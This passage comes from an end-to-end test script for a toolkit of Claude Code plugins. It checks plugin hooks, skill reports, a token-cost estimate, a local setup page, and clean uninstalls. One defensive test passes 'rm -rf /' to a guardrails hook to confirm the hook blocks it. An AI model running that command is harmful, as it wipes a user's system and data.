      child.stderr.on("data", (d) => (errText += d));
      child.stdout.on("data", (d) => (outText += d));
      await new Promise((r) => { const t = setTimeout(() => { child.kill(); r(); }, 120000); child.on("exit", () => { clearTimeout(t); r(); }); });
      srv.close();
      fs.rmSync(control, { recursive: true, force: true });
      const body = seen.map((b) => parse(b)).find((j) => j?.messages);
      const sent = JSON.stringify(body?.messages || []);
      check("marketplace", "Claude Code resumes the session chat-ferry imported and sends its turns to the model", !!body && sent.includes("fix the retry loop in client.go") && sent.includes("exponential backoff") && sent.includes("E2E_NEW_PROMPT"), (body ? "" : "no request reached the fake API; ") + `stderr: ${errText.slice(0, 300)} stdout: ${outText.slice(0, 300)}`);
      // Every user-only skill of the installed plugins, as plugin:skill (disable-model-invocation in its SKILL.md).
      const userOnly = [];
      for (const p of list) {
        const skills = path.join(p.installPath, "skills");
        for (const entry of fs.existsSync(skills) ? fs.readdirSync(skills) : []) {
          const file = path.join(skills, entry, "SKILL.md");
          const front = /^---\n([\s\S]*?)\n---/.exec(fs.existsSync(file) ? fs.readFileSync(file, "utf8").replace(/\r\n/g, "\n") : "")?.[1] || "";
          if (/^disable-model-invocation:\s*true\s*$/m.test(front)) userOnly.push(`${p.id.split("@")[0]}:${/^name:\s*(\S+)/m.exec(front)?.[1] || entry}`);
        }
      }
      const requests = seen.map((b) => parse(b)).filter((j) => j?.messages);
      const mentioned = (needle) => requests.filter((j) => JSON.stringify(j).includes(needle)).length;
      check("marketplace", "the first request Claude Code sent the model is a real one (a system prompt, a tool list) and lists a skill the model may invoke",
        !!body?.system && body.tools?.length > 0 && JSON.stringify(body).includes("e2e-control"), `${requests.length} requests; tools: ${body?.tools?.length}`);
      const listed = userOnly.filter((name) => mentioned(name) > 0);
      check("marketplace", `with every plugin installed, no request mentions any of the ${userOnly.length} user-only skills (${userOnly.join(", ")}): the estimate counts text the model is never sent`,
        userOnly.length >= 8 && listed.length === 0, `listed: ${listed.join(", ")}; found ${userOnly.length} user-only skills`);
    }
    const ping = pluginHook("nudge@claude-code-toolkit", "Notification", { message: "Claude needs your permission to use Bash", notification_type: "permission_prompt" });
    check("marketplace", "the nudge plugin's (notify's) own hook pings on a permission prompt", /permission/.test(parse(ping.out)?.terminalSequence || ""), ping.out + ping.err);
    const budget = pluginHook("spendcap@claude-code-toolkit", "UserPromptSubmit", { prompt: "hi", source: "user" });
    check("marketplace", "the spendcap plugin's (cost guard's) own hook runs, silent with no budget", budget.code === 0 && budget.out.trim() === "", budget.out + budget.err);
    const tidyHook = pluginHook("session-tidy@claude-code-toolkit", "SessionStart", null);
    check("marketplace", "the session-tidy plugin's own hook runs from the installed copy with nothing on stdin, and prints nothing", tidyHook.code === 0 && tidyHook.out === "" && tidyHook.err === "", tidyHook.out + tidyHook.err);
    // permission-doctor has no hook. Its plugin is one user-only skill whose two lines starting with an exclamation mark
    // and a backtick run its command, so run those lines as written, from the installed copy, against the config and
    // project made above.
    const pdPlugin = list.find((p) => p.id === "permission-doctor@claude-code-toolkit");
    const pdSkill = pdPlugin ? fs.readFileSync(path.join(pdPlugin.installPath, "skills", "check", "SKILL.md"), "utf8").replace(/\r\n/g, "\n") : "";
    const pdLines = pdSkill.split("\n").map((l) => /^!\x60(.*)\x60$/.exec(l)?.[1]).filter(Boolean);
    const pdReports = pdLines.map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", pdPlugin.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", pd.project), [], { cwd: pd.project, env: { ...pEnv, CLAUDE_CONFIG_DIR: pd.cfg }, shell: true }));
    check("marketplace", "the permission-doctor plugin's skill runs its lint and suggest reports from the installed copy",
      pdReports.length === 2 && pdReports.every((r) => r.code === 0 && r.err === "") && /^## permission-doctor lint/m.test(pdReports[0].out) && /^## permission-doctor suggest/m.test(pdReports[1].out)
        && (!want("permission-doctor") || (pdReports[0].out.includes("make deploy-staging") && pdReports[1].out.includes("docker compose up"))), pdReports.map((r) => r.out + r.err).join("\n---\n"));
    // hook-bench has no hook either: its skill's one `!` line runs the bench for the project. Run it as written from the
    // installed copy against the hook-bench config made above (the one with the deny hook, the invalid output and the misspelling).
    const hbPlugin = list.find((p) => p.id === "hook-bench@claude-code-toolkit");
    const hbSkill = hbPlugin ? fs.readFileSync(path.join(hbPlugin.installPath, "skills", "check", "SKILL.md"), "utf8").replace(/\r\n/g, "\n") : "";
    const hbLines = hbSkill.split("\n").map((l) => /^!\x60(.*)\x60$/.exec(l)?.[1]).filter(Boolean);
    const hbReports = hbLines.map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", hbPlugin.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", hb.project), [], { cwd: hb.project, env: { ...pEnv, CLAUDE_CONFIG_DIR: hb.cfg }, shell: true }));
    check("marketplace", "the hook-bench plugin's skill runs the bench's markdown report from the installed copy",
      hbReports.length === 1 && hbReports[0].code === 0 && /^## hook-bench: /m.test(hbReports[0].out) && (!want("hook-bench") || (/\| PreToolUs \| skipped \|/.test(hbReports[0].out) && /systemMessage: expected string/.test(hbReports[0].out))), hbReports.map((r) => r.out + r.err).join("\n---\n"));
    // settings-doctor has no hook either: its skill's one `!` line runs the lint for the project. Run it as written
    // from the installed copy against the settings-doctor config and project made above (the unknown key, the wrong
    // type, the trailing comma). The lint exits 1 when it finds something, which is the point.
    const sdPlugin = list.find((p) => p.id === "settings-doctor@claude-code-toolkit");
    const sdSkill = sdPlugin ? fs.readFileSync(path.join(sdPlugin.installPath, "skills", "check", "SKILL.md"), "utf8").replace(/\r\n/g, "\n") : "";
    const sdLines = sdSkill.split("\n").map((l) => /^!\x60(.*)\x60$/.exec(l)?.[1]).filter(Boolean);
    const sdReports = sdLines.map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", sdPlugin.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", sd.project), [], { cwd: sd.project, env: { ...pEnv, CLAUDE_CONFIG_DIR: sd.cfg }, shell: true }));
    check("marketplace", "the settings-doctor plugin's skill runs its lint report from the installed copy",
      sdReports.length === 1 && /^## settings-doctor lint/m.test(sdReports[0].out) && (!want("settings-doctor") || (sdReports[0].out.includes("unknown-key") && sdReports[0].out.includes("invalid-json"))), sdReports.map((r) => r.out + r.err).join("\n---\n"));
    // automode-doctor and mcp-check have no hook either: each skill's one `!` line runs a Markdown report for the
    // project. Run them as written from the installed copies against the configs and projects made above.
    const skillReports = (id, cfgDir, projectDir) => {
      const p = list.find((x) => x.id === id);
      const text = p ? fs.readFileSync(path.join(p.installPath, "skills", "check", "SKILL.md"), "utf8").replace(/\r\n/g, "\n") : "";
      return text.split("\n").map((l) => /^!\x60(.*)\x60$/.exec(l)?.[1]).filter(Boolean).map((line) => run(line.replaceAll("${CLAUDE_PLUGIN_ROOT}", p.installPath).replaceAll("${CLAUDE_PROJECT_DIR}", projectDir), [], { cwd: projectDir, env: { ...pEnv, CLAUDE_CONFIG_DIR: cfgDir }, shell: true }));
    };
    const adReports = skillReports("automode-doctor@claude-code-toolkit", ad.cfg, ad.project);
    check("marketplace", "the automode-doctor plugin's skill runs its report for the project from the installed copy",
      adReports.length === 1 && adReports[0].code === 0 && /^## automode-doctor report/m.test(adReports[0].out) && (!want("automode-doctor") || adReports[0].out.includes("Code from External")), adReports.map((r) => r.out + r.err).join("\n---\n"));
    const mcReports = skillReports("mcp-check@claude-code-toolkit", mc.cfg, mc.project);
    check("marketplace", "the mcp-check plugin's skill runs its lint report for the project from the installed copy",
      mcReports.length === 1 && mcReports[0].code === 0 && /^## mcp-check lint/m.test(mcReports[0].out) && (!want("mcp-check") || mcReports[0].out.includes("variable-unset")), mcReports.map((r) => r.out + r.err).join("\n---\n"));
    const sbReports = skillReports("sandbox-doctor@claude-code-toolkit", sb.cfg, sb.project);
    check("marketplace", "the sandbox-doctor plugin's skill runs its lint and host check from the installed copy",
      sbReports.length === 2 && sbReports.every((r) => r.code === 0) && /^## sandbox-doctor lint/m.test(sbReports[0].out) && /^## sandbox-doctor check/m.test(sbReports[1].out) && (!want("sandbox-doctor") || sbReports[0].out.includes("domain-scheme")), sbReports.map((r) => r.out + r.err).join("\n---\n"));
    const wdReports = skillReports("windows-doctor@claude-code-toolkit", wd.cfg, wd.project);
    check("marketplace", "the windows-doctor plugin's skill runs its check for the project from the installed copy",
      wdReports.length === 1 && wdReports[0].code === 0 && /^## windows-doctor check/m.test(wdReports[0].out), wdReports.map((r) => r.out + r.err).join("\n---\n"));
    let total = 0;
    for (const name of names) {
      const d = claude(["plugin", "details", `${name}@claude-code-toolkit`]);
      const m = /Always-on:\s+~?(\d+)\s*tok/.exec(d.out);
      total += m ? Number(m[1]) : 1000;
    }
    // The estimate counts the description of every user-only skill, and Claude Code never sends those to the
    // model; a new tool's skill adds 9 to 17 to it. The gate is the request that really went to the model (captured
    // above, with every plugin installed), which must mention none of those skills; the estimate stays a tripwire,
    // under 250 since 1.7.0 (sixteen plugins come to about 233), so a skill the model can invoke cannot slip in.
    check("marketplace", `all plugins together: about ${total} always-on tokens, by Claude Code's own estimate (limit 250)`, total < 250, String(total));
    const hud = list.find((p) => p.id === "glowbar@claude-code-toolkit");
    if (hud) {
      const t = claude(["plugin", "test", hud.installPath], 300000);
      const lines = (t.out + t.err).split("\n");
      const failed = lines.flatMap((l, i) => (/\(fail\)/.test(l) ? lines.slice(i, i + 4) : [])).join("\n");
      check("marketplace", "glowbar's engine tests (the glow HUD) pass in this Claude Code", t.code === 0 && /\b0 fail/.test(t.out + t.err), failed || (t.out + t.err).slice(-400));
    }
  }
}

// ---- the one-command setup: this checkout's installer, fetching the tools as a user's would ----------
// Its own home folder, with the same settings a user already had, so it cannot disturb the checks above.
if (want("setup")) {
  const sHome = path.join(base, "s");
  const sCfg = path.join(sHome, ".claude");
  fs.mkdirSync(sCfg, { recursive: true });
  fs.writeFileSync(path.join(sCfg, "settings.json"), JSON.stringify(ORIGINAL, null, 2) + "\n");
  const sEnv = { HOME: sHome, USERPROFILE: sHome, CLAUDE_CONFIG_DIR: sCfg };
  const KIT = path.join(HERE, "..", "bin", "claude-toolkit.mjs");
  const src = LOCAL ? ["--source", SIBLINGS] : [];
  const kit = (argv) => run(process.execPath, [KIT, ...argv, ...src], { cwd: project, env: sEnv });
  const sSettings = () => JSON.parse(fs.readFileSync(path.join(sCfg, "settings.json"), "utf8"));

  const inst = kit(["install", "recommended,cost-guard", "--preset", "strict", "--theme", "dracula", "--daily", "0.5usd"]);
  check("setup", "install recommended,cost-guard with options, in one command", inst.code === 0 && /Start a new Claude Code session/.test(inst.out), inst.out + inst.err);
  const hooks = JSON.stringify(sSettings().hooks || {}).replace(/\\\\/g, "/");
  check("setup", "every hook and the status line are in settings.json, the user's own keys kept",
    ["claude-code-guardrails/guard.mjs", "/notify/app/notify.mjs", "cost-guard/app/guard.mjs"].every((h) => hooks.includes(h)) && /claude-code-glow/.test(sSettings().statusLine?.command || "") && sSettings().env?.MY_VAR === "1", hooks.slice(0, 300));
  const pre = sSettings().hooks.PreToolUse.flatMap((g) => g.hooks).find((h) => JSON.stringify(h).includes("guardrails"));
  const deny = run(pre.command, pre.args, { cwd: project, env: sEnv, input: JSON.stringify({ session_id: "s", cwd: project, hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "rm -rf /" } }) });
  check("setup", "the guardrails hook it installed denies rm -rf /", parse(deny.out)?.hookSpecificOutput?.permissionDecision === "deny", deny.out + deny.err);
  const st = kit(["status"]);
  check("setup", "status reads the choices back", /Guardrails\s+installed \(preset strict\)/.test(st.out) && /theme dracula/.test(st.out) && /daily 0\.5usd/.test(st.out), st.out);

  // The setup page: started as a user would, then driven through its own API.
  const { spawn } = await import("node:child_process");
  const child = spawn(process.execPath, [KIT, "setup", "--web", "--no-open", ...src], { cwd: project, env: { ...ENV, ...sEnv }, stdio: ["ignore", "pipe", "pipe"], windowsHide: true });
  let childOut = "";
  child.stdout.on("data", (c) => { childOut += c; });
  child.stderr.on("data", (c) => { childOut += c; });
  const exited = new Promise((resolve) => child.on("exit", resolve));
  const url = await new Promise((resolve) => {
    const started = Date.now();
    const tick = setInterval(() => {
      const m = /http:\/\/127\.0\.0\.1:\d+\/\?t=[\w-]+/.exec(childOut);
      if (m || Date.now() - started > 30000) { clearInterval(tick); resolve(m?.[0]); }
    }, 100);
  });
  check("setup", "the setup page starts on 127.0.0.1 with a one-time key in its link", !!url, childOut);
  if (url) {
    const u = new URL(url);
    const token = u.searchParams.get("t");
    const api = (p, body) => fetch(`${u.origin}${p}`, { method: body ? "POST" : "GET", headers: { "x-toolkit-token": token, ...(body ? { "content-type": "application/json" } : {}) }, body: body ? JSON.stringify(body) : undefined });
    const page = await fetch(url);
    check("setup", "the page loads, with a strict Content-Security-Policy", page.status === 200 && /default-src 'none'/.test(page.headers.get("content-security-policy") || ""));
    check("setup", "the page refuses a request without the key", (await api("/api/state").then(() => fetch(`${u.origin}/api/state`))).status === 403);
    let state = null;
    for (let i = 0; i < 120 && !state?.ready; i++) { state = await (await api("/api/state")).json(); if (!state.ready) await new Promise((r) => setTimeout(r, 500)); }
    // The four installed above; project tools depend on what earlier sections left in the project.
    const userInstalled = (state?.tools || []).filter((t) => t.scope === "user" && t.installed).map((t) => t.id);
    check("setup", "it fetched all nineteen tools and sees what is installed", state?.ready && state.failed.length === 0 && userInstalled.length === 4 && state.glowThemes.length >= 15,
      JSON.stringify({ failed: state?.failed, userInstalled, glowThemes: state?.glowThemes?.length }));
    const applied = await (await api("/api/apply", { choices: { glow: { enabled: true, options: { theme: "nord", icons: "unicode", uiTheme: true } }, notify: { enabled: false } } })).text();
    const last = parse(applied.trim().split("\n").pop());
    const glowCfg = parse(fs.readFileSync(path.join(sCfg, "claude-code-glow", "config.json"), "utf8"));
    check("setup", "Apply on the page changes the glow theme and removes notify", last?.ok === true && glowCfg?.theme === "nord" && !JSON.stringify(sSettings().hooks || {}).includes("notify.mjs"), applied.slice(-600));
    await api("/api/quit", {});
  }
  const code = await Promise.race([exited, new Promise((r) => setTimeout(() => { child.kill(); r("killed"); }, 15000))]);
  check("setup", "Done stops the page's server", code === 0, `exit ${code}`);

  const un = kit(["uninstall", "all"]);
  check("setup", "uninstall all leaves settings.json exactly as the user had it", un.code === 0 && JSON.stringify(sSettings()) === JSON.stringify(ORIGINAL), JSON.stringify(sSettings()));
  if (!LOCAL) {
    const v = runCmd(NPX, ["-y", "github:nrzz/claude-code-toolkit", "--version"], { env: sEnv });
    check("setup", "npx -y github:nrzz/claude-code-toolkit runs from GitHub", v.code === 0 && /^\d+\.\d+\.\d+/.test(v.out.trim()), v.out + v.err);
  }
}

// ---- uninstall everything: the settings must be the user's own again ----------------------------------
if (!only.length) {
  for (const [repo, bin, argv] of [
    ["claude-cost-guard", "bin/claude-cost-guard.mjs", ["uninstall"]],
    ["claude-code-notify", "bin/claude-notify.mjs", ["uninstall"]],
    ["claude-code-guardrails", "bin/claude-guardrails.mjs", ["uninstall", "--scope", "user"]],
    ["claude-code-glow", "bin/claude-glow.mjs", ["uninstall"]],
  ]) {
    const r = tool(repo, bin, argv);
    check("uninstall", repo, r.code === 0, r.out + r.err);
  }
  const after = readSettings();
  check("uninstall", "settings.json is back to what the user had", JSON.stringify(after) === JSON.stringify(ORIGINAL), JSON.stringify(after));
}

// ---- report ---------------------------------------------------------------------------------------
const failed = results.filter((r) => !r.ok);
// A run that checked nothing is not a pass (a wrong --only once made every section skip).
if (!results.length) failed.push({ area: "e2e", what: `no checks ran${only.length ? ` for --only ${only.join(",")}` : ""}` });
const passed = results.filter((r) => r.ok).length;
console.log(results.length
  ? `\n${passed} of ${results.length} checks passed${failed.length ? `; failed: ${failed.map((f) => `${f.area}: ${f.what}`).join("; ")}` : ""}.`
  : `\nNo checks ran${only.length ? ` (--only ${only.join(",")} names no section: glow, guardrails, notify, cost-guard, replay, chat-ferry, session-tidy, permission-doctor, hook-bench, relocate, settings-doctor, automode-doctor, mcp-check, sandbox-doctor, windows-doctor, starter, md-doctor, team-sync, handover, setup, marketplace)` : ""}.`);
if (!args.includes("--keep")) fs.rmSync(base, { recursive: true, force: true });
process.exitCode = failed.length ? 1 : 0;
